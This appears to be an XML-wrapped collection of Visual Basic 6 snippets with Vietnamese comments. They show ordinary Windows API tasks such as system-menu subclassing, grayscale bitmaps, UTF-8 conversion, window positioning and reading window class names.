Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Const GWL_WNDPROC  As Long = (-4)
Private lDefWindowProc As Long
'======================
' XU LY MENU HETHONG

Public Sub AddMenuSystem(ByVal vlHwnd As Long, ByVal vsNameMenu As String)
    
    Dim hMenu As Long
    hMenu = GetSystemMenu(vlHwnd, False) ' flase
' them vach phan chia
    If vsNameMenu = "-" Then
        Call AppendMenu(hMenu, MF_SEPARATOR, 0, 0&amp;)
    Else
        Call AppendMenu(hMenu, MF_STRING, WM_MENUBASE + giCurrentId, vsNameMenu)
    End If
    giCurrentId = giCurrentId + 1

End Sub


Public Sub UnSubClass(hwnd As Long)
' phuc hoi trinh xu ly mac dinh truoc khi thoat
    If lDefWindowProc Then
        SetWindowLong hwnd, GWL_WNDPROC, lDefWindowProc
    End If

End Sub


Public Sub SubClass(ByVal hwnd As Long)
    On Error Resume Next
' gan trinh xu ly thong diep cua chung ta
    lDefWindowProc = SetWindowLong(hwnd, GWL_WNDPROC, AddressOf WindowProc)
End Sub


Public Function WindowProc(ByVal hwnd As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

On Error Resume Next
    Select Case uMsg
        Case WM_SYSCOMMAND
          ' neu khong pahi thong diep cÇn xö lý thi bo qua
          If (wParam &lt; WM_MENUBASE) Or (wParam &gt;= (WM_MENUBASE + giCurrentId)) Then
              GoTo skip
          End If
          
          Select Case wParam - WM_MENUBASE
              Case 1
                  MsgBox "(c) namvirila@yahoo.com", vbInformation
                   Exit Function
              Case Else
                  Unload Form1
                  Exit Function
          End Select
        Case Else
    End Select

skip:
   WindowProc = CallWindowProc(lDefWindowProc, hwnd, uMsg, wParam, lParam)

End Function

'----add vào Form
Option Explicit

Private Sub Command1_Click()
    DelMenuClose Me
End Sub

Private Sub Command2_Click()
    AddMenuSystem Me.hwnd, "-"
    AddMenuSystem Me.hwnd, "about:"
    AddMenuSystem Me.hwnd, "-"
    AddMenuSystem Me.hwnd, "Thoat"
    SubClass Me.hwnd
End Sub

Private Sub Command3_Click()
    Chemenu Me, 0
End Sub

Private Sub Form_Unload(Cancel As Integer)
    Call UnSubClass(Me.hwnd)
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0608241114581241</MaVD>
    <NoiDung>Option Explicit

Private Type BITMAP
    bmType As Long
    bmWidth As Long
    bmHeight As Long
    bmWidthBytes As Long
    bmPlanes As Integer
    bmBitsPixel As Integer
    bmBits As Long
End Type
Private Declare Function GetObject Lib "gdi32" Alias "GetObjectA" (ByVal hObject As Long, ByVal nCount As Long, lpObject As Any) As Long
Private Declare Function GetBitmapBits Lib "gdi32" (ByVal hBitmap As Long, ByVal dwCount As Long, lpBits As Any) As Long
Private Declare Function SetBitmapBits Lib "gdi32" (ByVal hBitmap As Long, ByVal dwCount As Long, lpBits As Any) As Long
Dim PicBits() As Byte, PicInfo As BITMAP
Dim Cnt As Long, BytesPerLine As Long

Private Sub Command1_Click()
    GetObject Picture1.Image, Len(PicInfo), PicInfo
    
    ReDim PicBits(1 To PicInfo.bmWidth * PicInfo.bmHeight * 4) As Byte
    
    GetBitmapBits Picture1.Image, UBound(PicBits), PicBits(1)
    
    For Cnt = 1 To UBound(PicBits) Step 4
        PicBits(Cnt) = PicBits(Cnt) / 3 + PicBits(Cnt + 1) / 3 + PicBits(Cnt + 2) / 3
        PicBits(Cnt + 1) = PicBits(Cnt)
        PicBits(Cnt + 2) = PicBits(Cnt)
    Next Cnt
    
    SetBitmapBits Picture1.Image, UBound(PicBits), PicBits(1)
    Picture1.Refresh
End Sub

</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609031901461129</MaVD>
    <NoiDung>Private Function UTF8ToUnicode(UTF8Str As String) As String
    Dim indexS As Long, UTF8 As Long, U16 As Long, BArrayS() As Byte, lastbyte As Byte
    BArrayS() = UTF8Str
    indexS = LBound(BArrayS)
 
    While indexS &lt;= UBound(BArrayS)
        UTF8 = BArrayS(indexS)
        If UTF8 = &amp;HE1 Or UTF8 = &amp;HE2 Then ' 3 bytes
            lastbyte = Merge(BArrayS(indexS + 4), BArrayS(indexS + 5))
            U16 = (BArrayS(indexS) And &amp;HF) * &amp;H1000 + (BArrayS(indexS + 2) And &amp;H3F) * &amp;H40 + (lastbyte And &amp;H3F)
            
            UTF8ToUnicode = UTF8ToUnicode &amp; ChrW(U16)
            
            indexS = indexS + 6
        ElseIf ((UTF8 &gt;= &amp;HC3) And (UTF8 &lt;= &amp;HC6)) Or UTF8 = &amp;HCB Then '2 bytes
            lastbyte = Merge(BArrayS(indexS + 2), BArrayS(indexS + 3))
            U16 = (BArrayS(indexS) And &amp;H1F) * &amp;H40 + (lastbyte And &amp;H3F)
            
            UTF8ToUnicode = UTF8ToUnicode &amp; ChrW(U16)
            
            indexS = indexS + 4
        Else ' 1 byte
            UTF8ToUnicode = UTF8ToUnicode &amp; Chr(UTF8)
            indexS = indexS + 2
        End If
    Wend
End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609051659041472</MaVD>
    <NoiDung>Option Explicit

Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByRef lParam As Any) As Long
Private Const TCM_FIRST As Long = &amp;H1300
Private Const TCM_SETITEMW As Long = (TCM_FIRST + 61)
Private Const TCM_GETITEMW As Long = (TCM_FIRST + 60)
Private Const TCIF_TEXT As Long = &amp;H1

Private Type TCITEM
    mask As Long
    dwState As Long
    dwStateMask As Long
    pszText As Long
    cchTextMax As Long
    iImage As Long
    lParam As Long
End Type


Private Sub setText(Text As String, Item As Integer)
    Dim mTab As TCITEM
    
    With mTab
        .pszText = StrPtr(Text)
        .mask = TCIF_TEXT
    End With
    
    SendMessage TabStrip1.hwnd, TCM_SETITEMW, Item, mTab
End Sub

Private Function GetText(Item As Integer) As String
    Dim mTab As TCITEM, l As Long
    Dim a(255) As Byte
    
    With mTab
        .pszText = VarPtr(a(0))
        .cchTextMax = 256
        .mask = TCIF_TEXT
    End With
    
    l = SendMessage(TabStrip1.hwnd, TCM_GETITEMW, Item, mTab)
    GetText = Left(a(), InStr(a(), vbNullChar) - 1)
End Function

Private Sub Command1_Click()
    setText "Ti" &amp; ChrW(7871) &amp; "ng Vi" &amp; ChrW(7879) &amp; "t", 0
    setText "Thành Ph" &amp; ChrW(7889) &amp; " H" &amp; ChrW(7891) &amp; " Chí Minh", 1
End Sub

Private Sub Command2_Click()
    Dim aText As String
    aText = GetText(1)
    setText aText, 0
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609121738281934</MaVD>
    <NoiDung>Option Explicit

Public Declare Function WideCharToMultiByte Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long, ByRef lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As String, ByVal lpUsedDefaultChar As Long) As Long
Public Declare Function MultiByteToWideChar Lib "kernel32" (ByVal CodePage As Long, ByVal dwFlags As Long, ByRef lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpWideCharStr As Long, ByVal cchWideChar As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (lpvDest As Any, lpvSource As Any, ByVal cbCopy As Long)
Public Const CP_UTF8 = 65001

Public Function UTF82Unicode(ByVal sUTF8 As String) As String

    Dim UTF8Size      As Long
    Dim BufferSize    As Long
    Dim BufferUNI     As String
    Dim LenUNI        As Long
    Dim bUTF8()       As Byte

    If LenB(sUTF8) = 0 Then Exit Function

    bUTF8 = StrConv(sUTF8, vbFromUnicode)
    UTF8Size = UBound(bUTF8) + 1

    BufferSize = UTF8Size * 2
    BufferUNI = String$(BufferSize, vbNullChar)
    
    LenUNI = MultiByteToWideChar(CP_UTF8, 0, bUTF8(0), UTF8Size, StrPtr(BufferUNI), BufferSize)
    
    If LenUNI Then
        UTF82Unicode = Left$(BufferUNI, LenUNI)
    End If

End Function


Public Function Unicode2UTF8(ByVal strUnicode As String) As String

    Dim LenUNI     As Long
    Dim BufferSize As Long
    Dim LenUTF8    As Long
    Dim bUTF8()    As Byte
    
    LenUNI = Len(strUnicode)
    
    If LenUNI = 0 Then Exit Function

    BufferSize = LenUNI * 3 + 1
    ReDim bUTF8(BufferSize - 1)
    
    LenUTF8 = WideCharToMultiByte(CP_UTF8, 0, StrPtr(strUnicode), LenUNI, bUTF8(0), BufferSize, vbNullString, 0)
    
    If LenUTF8 Then
        ReDim Preserve bUTF8(LenUTF8 - 1)
        Unicode2UTF8 = StrConv(bUTF8, vbUnicode)
    End If

End Function
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609221153190157</MaVD>
    <NoiDung>Private Sub Text1_KeyPress(KeyAscii As Integer)
 If InStr("1234567890" + Chr$(vbKeyBack), Chr$(KeyAscii)) = 0 Then
  KeyAscii = 0
  Beep
 End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609221225330137</MaVD>
    <NoiDung>Function bDirExists(sDir As String) As Boolean
 On Error Resume Next
 bDirExists = ((GetAttr(sDir) And vbDirectory) &lt;&gt; 0)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609241315420844</MaVD>
    <NoiDung>'Thêm 1 Frame vào Form, đặt 1 PictureBox vào Frame, đặt 1 TextBox vào PictureBox
Private Declare Function GetAncestor Lib "user32.dll" (ByVal hwnd As Long, ByVal gaFlags As Long) As Long
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Private Const GA_ROOT = 2
Private Const GA_PARENT = 1
Private Const GA_ROOTOWNER = 3
Private Sub Form_Load()
    'This example was submitted by Abdul Gafoor.GK
    '             (gafoorgk@hotmail.com)
    Dim ParenthWnd_1 As Long
    Dim ParenthWnd_2 As Long
    ParenthWnd_1 = GetAncestor(Text1.hwnd, GA_ROOT)
    ParenthWnd_2 = GetParent(Text1.hwnd)
    Me.AutoRedraw = True
    Me.Print "Parent of the textbox: " + CStr(ParenthWnd_2)
    Me.Print "Root ancestor of the textbox: " + CStr(ParenthWnd_1)
    Me.Print "This form's handle: " + CStr(Me.hwnd)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609300108040361</MaVD>
    <NoiDung>Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
Private Sub Form_Load()
    'KPD-Team 1998
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Hide the cursor
    ShowCursor 0
    'Wait 10 seconds
    t = Timer
    Do: DoEvents: Loop Until Timer &gt; t + 10
    'Show the cursor
    ShowCursor 1
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609300111290441</MaVD>
    <NoiDung>Sub Form_Paint()
Dim I As Integer, X As Integer, Y As Integer
Dim C As String
    Cls
    For I = 0 To 91
        X = CurrentX
        Y = CurrentY
        C = Chr(I)
        'Line -(X + TextWidth(C), Y = TextHeight(C)), _
        QBColor(Rnd * 16), BF
        CurrentX = X
        CurrentY = Y
        ForeColor = RGB(Rnd * 256, Rnd * 256, Rnd * 256)
        Print "Hello World Hello World Hello World Hello"
    Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609300113460646</MaVD>
    <NoiDung>Private Declare Function SHEmptyRecycleBin Lib "shell32.dll" Alias "SHEmptyRecycleBinA" (ByVal hwnd As Long, ByVal pszRootPath As String, ByVal dwFlags As Long) As Long

Private Const SHERB_NORMAL = &amp;H0 'Normal execution

Private Const SHERB_NOCONFIRMATION = &amp;H1 'execute without confirmation

Private Const SHERB_NOPROGRESSUI = &amp;H2 'execute without progress window

Private Const SHERB_NOSOUND = &amp;H4 'execute without sound

Private Const SHERB_NOALL = (SHERB_NOCONFIRMATION And SHERB_NOPROGRESSUI And SHERB_NOSOUND)
Dim RetVal As Long

Private Sub EmpRecBin()
    RetVal = SHEmptyRecycleBin(0&amp;, vbNullString, SHERB_NORMAL)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609300120190282</MaVD>
    <NoiDung>Private Declare Function InvalidateRect Lib "user32" (ByVal hwnd As Long, lpRect As Long, ByVal bErase As Long) As Long
'Tip From Desktop3 by Paul Pauvic :Repaint all windows

'Thêm 1 CommandButton vào Form
Private Sub Command1_Click()
    InvalidateRect 0&amp;, 0&amp;, False
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609300125280062</MaVD>
    <NoiDung>Private Sub Form_Load()
If App.PrevInstance Then End
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0609300143190196</MaVD>
    <NoiDung>Private Const vbMsgBoxTopMost As Long = &amp;H40000

Private Sub Form_Load()
    MsgBox "VBLib", vbMsgBoxSetForeground
    'MsgBox "VBLib", vbMsgBoxSetForeground And vbMsgBoxSetForeground
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0610251115041089</MaVD>
    <NoiDung>'Cần phải có 1 listbox chuẩn của VB và 1 label nằm bên cạnh.
'Listbox nhớ đặt sorted = true
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByRef lParam As Any) As Long
Const LB_DIR As Long = &amp;H18D
Enum DirListConstant
    DDL_EXCLUSIVE = &amp;H8000
    DDL_ARCHIVE = &amp;H20
    DDL_DIRECTORY = &amp;H10
    DDL_DRIVES = &amp;H4000
    DDL_HIDDEN = &amp;H2
    DDL_READONLY = &amp;H1
    DDL_SYSTEM = &amp;H4
End Enum

Private Function DirList(hwnd As Long, ByVal path As String, filetype As DirListConstant) As Boolean
    If Right$(path, 1) &lt;&gt; "\" Then
        path = path &amp; "\\*"
    Else
        path = path &amp; "\*"
    End If
    Dim arr() As Byte
    arr() = StrConv(path, vbFromUnicode)
    DirList = IIf(SendMessage(hwnd, LB_DIR, filetype, arr(0)) &lt; 0, False, True)
    Erase arr
End Function

Private Sub Form_Load()
    Call DirList(List1.hwnd, "c:\windows", DDL_ARCHIVE Or DDL_DIRECTORY Or DDL_HIDDEN Or DDL_READONLY Or DDL_SYSTEM)
    Label1.Caption = List1.ListCount
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074423044401</MaVD>
    <NoiDung>Private Sub Timer1_Timer()
   Text1.LinkTopic = "iexplore|WWW_GetWindowInfo"
   Text1.LinkTimeout = 10
   Text1.LinkMode = vbLinkManual
   Text1.LinkItem = &amp;HFFFFFFFF
   Text1.LinkRequest
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070823090856</MaVD>
    <NoiDung>'module
  ' the max length of a path for the system (usually 260 or there abouts)
  ' this is used to size the buffer string for retrieving the class name of the active window below
  public Const MAX_PATH as Long = 260&amp;

  public Const API_FALSE as Long = 0&amp;
   
  ' made up constants for setting our timer
  public Const NV_CLOSEMSGBOX as Long = &amp;H5000&amp;
  public Const NV_MOVEMSGBOX as Long = &amp;H5001&amp;

  ' MessageBox() Flags
  public Const MB_ICONQUESTION as Long = &amp;H20&amp;
  public Const MB_TASKMODAL as Long = &amp;H2000&amp;

  ' SetWindowPos Flags
  public Const SWP_NOSIZE as Long = &amp;H1&amp;
  public Const SWP_NOZORDER as Long = &amp;H4&amp;
  public Const HWND_TOP as Long = 0&amp;

  Type RECT
    Left as Long
    Top as Long
    Right as Long
    Bottom as Long
  End Type

  ' API declares
  public Declare Function LockWindowUpdate&amp; Lib "user32" (byval hwndLock&amp;)
   
  public Declare Function GetActiveWindow&amp; Lib "user32" ()
   
  public Declare Function GetDesktopWindow&amp; Lib "user32" ()
   
  public Declare Function FindWindow&amp; Lib "user32" Alias "FindWindowA" (byval lpClassName$, _
                                                                        byval lpWindowName$)

  public Declare Function SetForegroundWindow&amp; Lib "user32" (byval hWnd&amp;)
   
  public Declare Function GetClassName&amp; Lib "user32" Alias "GetClassNameA" (byval hWnd&amp;, _
                                                        byval lpClassName$, byval nMaxCount&amp;)

  public Declare Function GetWindowRect&amp; Lib "user32" (byval hWnd&amp;, lpRect as RECT)
   
  public Declare Function SetWindowPos&amp; Lib "user32" (byval hWnd&amp;, byval hWndInsertAfter&amp;, _
                                      byval x&amp;, byval y&amp;, byval cx&amp;, byval cy&amp;, byval wFlags&amp;)
                                       
  public Declare Function MessageBox&amp; Lib "user32" Alias "MessageBoxA" (byval hWnd&amp;, _
                                                byval lpText$, byval lpCaption$, byval wType&amp;)

  public Declare Function SetTimer&amp; Lib "user32" (byval hWnd&amp;, byval nIDEvent&amp;, byval uElapse&amp;, _
                                                                            byval lpTimerFunc&amp;)
   
  public Declare Function KillTimer&amp; Lib "user32" (byval hWnd&amp;, byval nIDEvent&amp;)

public Sub TimerProc(byval hWnd&amp;, byval uMsg&amp;, byval idEvent&amp;, byval dwTime&amp;)
  ' this is a callback function. This means that windows "calls back" to this function
  ' when it's time for the timer event to fire
   
  ' first thing we do is kill the timer so that no other timer events will fire
  KillTimer hWnd, idEvent
   
  ' select the type of manipulation that we want to perform
  Select Case idEvent
    Case NV_CLOSEMSGBOX '&amp;lt;-- we want to close this messagebox after 4 seconds
      Dim hMessageBox&amp;
       
      ' find the messagebox window
      hMessageBox = FindWindow("#32770", "Self Closing Message Box")
       
      ' if we found it make sure it has the keyboard focus and then send it an enter to dismiss it
      If hMessageBox then
        Call SetForegroundWindow(hMessageBox)
        SendKeys "{enter}"
      End If
       
    Case NV_MOVEMSGBOX '&amp;lt;-- we want to move this messagebox
      Dim hMsgBox&amp;, xPoint&amp;, yPoint&amp;
      Dim stMsgBoxRect as RECT, stParentRect as RECT
       
      ' find the messagebox window
      hMsgBox = FindWindow("#32770", "Position A Message Box")
     
      ' if we found it then move it
      If hMsgBox then
        ' get the rect for the parent window and the messagebox
        Call GetWindowRect(hMsgBox, stMsgBoxRect)
        Call GetWindowRect(hWnd, stParentRect)
         
        ' calculate the position for putting the messagebox in the middle of the form
        xPoint = stParentRect.Left + (((stParentRect.Right - stParentRect.Left) \ 2) - _
                                              ((stMsgBoxRect.Right - stMsgBoxRect.Left) \ 2))
        yPoint = stParentRect.Top + (((stParentRect.Bottom - stParentRect.Top) \ 2) - _
                                              ((stMsgBoxRect.Bottom - stMsgBoxRect.Top) \ 2))
         
        ' move the messagebox
        Call SetWindowPos(hMsgBox, HWND_TOP, xPoint, yPoint, _
                                        API_FALSE, API_FALSE, SWP_NOZORDER Or SWP_NOSIZE)
      End If
       
      ' unlock the desktop
      Call LockWindowUpdate(API_FALSE)
   
  End Select
   
End Sub

'-------------------

'form
private Sub Command1_Click()
  ' this shows a messagebox that will be dismissed after 4 seconds
   
  ' set the callback timer and pass our application defined ID (NV_CLOSEMSGBOX)
  ' set the time for 4 seconds (4000&amp; microseconds)
  SetTimer hWnd, NV_CLOSEMSGBOX, 4000&amp;, AddressOf TimerProc

  ' call the messagebox API function
  Call MessageBox(hWnd, "Watch this message box close itself after four seconds", _
      "Self Closing Message Box", MB_ICONQUESTION Or MB_TASKMODAL)
   
End Sub

private Sub Command2_Click()
  ' this positions the messagebox in the desired location on the screen.
  ' the location is defined in the callback timer function
   
  ' lock the desktop so that the initial position is not shown
  Call LockWindowUpdate(GetDesktopWindow())
   
  ' set the callback timer with our application defined ID (NV_MOVEMSGBOX)
  ' set the time for 10 microseconds to allow the messagebox time to become active
  SetTimer hWnd, NV_MOVEMSGBOX, 10&amp;, AddressOf TimerProc

  ' call the messagebox API function
  Call MessageBox(hWnd, "message box in't in the middle of the screen?", _
      "Position A Message Box", MB_ICONQUESTION Or MB_TASKMODAL)

End Sub </NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070015110018</MaVD>
    <NoiDung>'Copy đoạn code này vào Form
Option Explicit
Private Sub Form_Unload(Cancel As Integer)
    If IsHooked Then
         Unhook   ' Ngưng kiểm tra các message.
    End If
End Sub
 
Private Sub MSFlexGrid1_LeaveCell()
    MSFlexGrid1.Text = txt1.Text
    txt1.Visible = False
End Sub
 
Private Sub MSFlexGrid1_MouseUp(Button As Integer, _
    Shift As Integer, x As Single, y As Single)
    Static CurrentWidth As Single
    ' Kiểm tra xem kích thước bề ngang của ô có thay đổi không
    If MSFlexGrid1.CellWidth &lt;&gt; CurrentWidth Then
         txt1.Width = MSFlexGrid1.CellWidth   ' Nếu có thì thay đổi kích thước txt1
         CurrentWidth = MSFlexGrid1.CellWidth
    End If
End Sub
Private Sub Form_Load()
    gHW = MSFlexGrid1.hWnd
    Hook   ' Bắt đầu kiểm tra các message.
    MSFlexGrid1.AllowUserResizing = flexResizeColumns
    MSFlexGrid1.Cols = 4
    MSFlexGrid1.Rows = 6
    MSFlexGrid1.RowHeightMin = txt1.Height
    txt1.Visible = False
    txt1.ZOrder (0)
    txt1.Width = MSFlexGrid1.CellWidth
End Sub
Private Sub MSFlexGrid1_Click()
    ' Xác định vị trí và kích thước TextBox, và hiển thị nó
 
    txt1.Width = MSFlexGrid1.CellWidth
    txt1.Left = MSFlexGrid1.CellLeft + MSFlexGrid1.Left
    txt1.Top = MSFlexGrid1.CellTop + MSFlexGrid1.Top
    txt1.Text = MSFlexGrid1.Text
    txt1.Visible = True
    'txt1.SelStart = Len(txt1.Text)
    txt1.SetFocus
End Sub
 
'Copy đoạn code này vào Module
Option Explicit
Declare Function CallWindowProc Lib "user32" Alias _
    "CallWindowProcA" (ByVal lpPrevWndFunc As Long, _
    ByVal hWnd As Long, ByVal Msg As Long, _
    ByVal wParam As Long, ByVal lParam As Long) As Long
Declare Function SetWindowLong Lib "user32" Alias _
    "SetWindowLongA" (ByVal hWnd As Long, _
    ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Const GWL_WNDPROC = -4
Private Const WM_SIZE = &amp;H5
Private Const WM_PAINT = &amp;HF
Private lpPrevWndProc As Long
Public IsHooked As Boolean
Public gHW As Long
Public Sub Hook()
    If Not IsHooked Then
        lpPrevWndProc = SetWindowLong(gHW, GWL_WNDPROC, AddressOf WindowProc)
        IsHooked = True
    End If
End Sub
Public Sub Unhook()
    Dim temp As Long
    temp = SetWindowLong(gHW, GWL_WNDPROC, lpPrevWndProc)
    IsHooked = False
End Sub
Function WindowProc(ByVal hw As Long, ByVal uMsg As _
    Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    WindowProc = CallWindowProc(lpPrevWndProc, hw, _
             uMsg, wParam, lParam)
    If uMsg = WM_SIZE Or uMsg = WM_PAINT Then
        Form1.txt1.Width = Form1.MSFlexGrid1.CellWidth
        Form1.txt1.Left = Form1.MSFlexGrid1.CellLeft + Form1.MSFlexGrid1.Left
        Form1.txt1.Top = Form1.MSFlexGrid1.CellTop + Form1.MSFlexGrid1.Top
    End If
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075216085229</MaVD>
    <NoiDung>Option Explicit
 
Private Declare Function sndPlaySound Lib "winmm.dll" Alias "sndPlaySoundA" (ByVal lpszSoundName As String, ByVal uFlags As Long) As Long
 
Private Const SND_ASYNC As Long = &amp;H1
Private Const SND_MEMORY As Long = &amp;H4
Private Const SND_NODEFAULT = &amp;H2
Private Const Flags&amp; = SND_ASYNC Or SND_NODEFAULT Or SND_MEMORY
 
Private Sub Command1_Click()
  Dim b As String
   
  b = StrConv(LoadResData(101, "WAVE"), vbUnicode)
   
  sndPlaySound b, Flags&amp;
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074522034517</MaVD>
    <NoiDung>Private Declare Function SetForegroundWindow Lib "User32" (ByVal hWnd As Long) As Long
Private Declare Sub SetWindowPos Lib "User32" (ByVal hWnd As Long, ByVal hWndInsertAfter As Long, ByVal X As Long, ByVal Y As Long, ByVal cx As Long, ByVal cy As Long, ByVal wFlags As Long)

Const HWND_TOPMOST = -1
Const HWND_NOTOPMOST = -2
Const SWP_NOSIZE = &amp;H1
Const SWP_NOMOVE = &amp;H2
Const SWP_SHOWWINDOW = &amp;H40

Private Sub Timer1_Timer()
    SetForegroundWindow (Me.hWnd)
    SetWindowPos Me.hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_SHOWWINDOW Or SWP_NOMOVE Or SWP_NOSIZE
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>071205071256</MaVD>
    <NoiDung>Option Explicit
Const PROCESS_QUERY_INFORMATION = 1024
Const PROCESS_VM_READ = 16
Const MAX_PATH As Integer = 260

Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
Private Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hwnd As Long, lpdwProcessId As Long) As Long
Private Declare Function OpenProcess Lib "Kernel32.dll" (ByVal dwDesiredAccessas As Long, ByVal bInheritHandle As Long, ByVal dwProcId As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
Private Declare Function EnumProcessModules Lib "PSAPI.DLL" (ByVal hProcess As Long, ByRef lphModule As Long, ByVal cb As Long, ByRef cbNeeded As Long) As Long
Private Declare Function GetModuleFileNameEx Lib "PSAPI.DLL" Alias "GetModuleFileNameExA" (ByVal hProcess As Long, ByVal hModule As Long, ByVal ModuleName As String, ByVal nSize As Long) As Long

Private Sub Command1_Click()
  Dim Ret As String
    Dim whwnd As Long
    Dim hMod As Long
    Dim theProcess As Long
    Dim lngCBSize2 As Long
    Dim lngModules(1 To 1) As Long
    Dim lngReturn As Long
    Dim strModuleName As String
    Dim lngSize As Long
    Dim strProcessName As String
    
    'Lấy tiêu đề cửa sổ
    Ret = InputBox("Nhap tieu de cua so vao day:")
    If Ret = "" Then Exit Sub
    
    whwnd = FindWindow(vbNullString, Ret)
    If whwnd &lt;&gt; 0 Then
        hMod = GetWindowThreadProcessId(whwnd, theProcess)
        If hMod &lt;&gt; 0 Then
            'Get a handle to the Process and Open
            Dim lngHwndProcess As Long
            lngHwndProcess = OpenProcess(PROCESS_QUERY_INFORMATION Or PROCESS_VM_READ, 0, theProcess)
            If lngHwndProcess &lt;&gt; 0 Then
                    'Get an array of the module handles for the specified process
                    lngReturn = EnumProcessModules(lngHwndProcess, lngModules(1), 1, lngCBSize2)
                    'If the Module Array is retrieved, Get the ModuleFileName
                     If lngReturn &lt;&gt; 0 Then
                        'Buffer with spaces first to allocate memory for byte array
                            strModuleName = Space(MAX_PATH)
                            'Must be set prior to calling API
                            lngSize = 500
                            'Get Process Name
                            lngReturn = GetModuleFileNameEx(lngHwndProcess, lngModules(1), strModuleName, lngSize)
                            If lngReturn &gt; 0 Then
                                'Remove trailing spaces
                                strProcessName = Left(strModuleName, lngReturn)
                            End If
                    End If
             End If
             'Close the handle to this process
             lngReturn = CloseHandle(lngHwndProcess)
        End If 'process finded
    End If 'window finded
    If Len(strProcessName) &gt; 0 Then
        'Hiển thị kết quả
        MsgBox "Found: " &amp; strProcessName
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>072505072559</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>072805072855</MaVD>
    <NoiDung />
  </Vidu>
  <Vidu>
    <MaVD>073205073210</MaVD>
    <NoiDung>Option Explicit
 
Private Const WM_GETTEXT = &amp;HD
Private Const WM_GETTEXTLENGTH = &amp;HE
 
Private Type POINTAPI
  X As Long
  Y As Long
End Type
 
Private Declare Function GetParent Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hwnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
 
 
Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
 
Dim Pt As POINTAPI, mWnd As Long
Dim lpClassName As String, RetVal As Long
 
'Get the current cursor position
GetCursorPos Pt
 
'Get the window under the cursor
mWnd = WindowFromPoint(Pt.X, Pt.Y)
Text1.Text = "Handle = " &amp; mWnd
 
lpClassName = Space(256)
RetVal = GetClassName(mWnd, lpClassName, 256)
lpClassName = Left$(lpClassName, RetVal)
Text2.Text = "Classname = " &amp; lpClassName
 
Dim length As Long
Dim result As Long
Dim strtmp As String
length = SendMessage(mWnd, WM_GETTEXTLENGTH, ByVal 0, ByVal 0) + 1
strtmp = Space(length)
result = SendMessage(mWnd, WM_GETTEXT, ByVal length, ByVal strtmp)
Dim s As Variant
Dim st As String
s = Split(strtmp, vbNullChar)
Text3.Text = "Text = " &amp; s(0)
 
'----------------------------------
 
txtAZ.Text = ""
txtZA.Text = ""
 
'----------------------------------
Dim h As Long, sClass As String
h = WindowFromPoint(Pt.X, Pt.Y)
txtAZ.Text = GetClsName(h)
txtZA.Text = GetClsName(h)
While h  0
  h = GetParent(h)
  sClass = GetClsName(h)
  If sClass  "" Then
    txtAZ.Text = sClass &amp; " -&gt; " &amp; txtAZ.Text
    txtZA.Text = txtZA.Text &amp; " -&gt; " &amp; sClass
  End If
Wend
 
End Sub
 
Public Function GetClsName(hwnd As Long) As String
  Dim lpClassName As String, RetVal As Long
  
  lpClassName = Space(256)
  RetVal = GetClassName(hwnd, lpClassName, 256)
